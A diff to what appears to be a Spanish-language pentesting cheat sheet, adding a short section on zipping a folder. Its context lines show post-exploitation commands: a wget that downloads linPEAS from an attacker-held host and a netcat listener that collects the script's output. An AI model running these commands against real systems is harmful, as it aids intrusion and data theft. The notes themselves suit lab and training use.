@@ -1250,6 +1250,13 @@ wget 10.10.14.80:8080/linpeas.sh
 nc -lvnp 9002 | tee linpeas.out 
 
 ```
+## Zip
+
+Para comprimir un archivo o carpeta usa
+
+```
+zip -r socat.zip socat/
+```
 
 
 ## Tar
